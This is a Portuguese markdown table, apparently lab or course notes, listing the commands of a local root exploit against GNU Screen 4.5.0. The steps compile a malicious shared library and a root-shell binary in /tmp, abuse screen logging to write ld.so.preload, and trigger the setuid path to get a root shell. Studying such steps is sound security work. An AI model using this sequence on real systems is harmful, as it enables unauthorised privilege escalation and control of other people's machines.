# Comandos Principais - Vulnerable Services

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `screen -v` | Identificar versão do Screen instalada | Confirmação de versão vulnerável (ex.: `4.05.00`) |
| `./screen_exploit.sh` | Executar exploit local para Screen 4.5.0 | Tentativa de escalar para root |
| `id` | Confirmar nível de privilégio após exploração | Verificação de `uid=0(root)` |
| `gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c` | Compilar biblioteca maliciosa usada no fluxo do exploit | Geração de `/tmp/libhax.so` |
| `gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration` | Compilar binário de shell privilegiado | Geração de `/tmp/rootshell` |
| `screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"` | Forçar criação/uso de `ld.so.preload` no contexto vulnerável | Preparação da carga para execução como root |
| `screen -ls` | Acionar trecho setuid do Screen no exploit | Disparo do fluxo de escalada |
| `/tmp/rootshell` | Abrir shell após o gatilho da exploração | Shell root local |

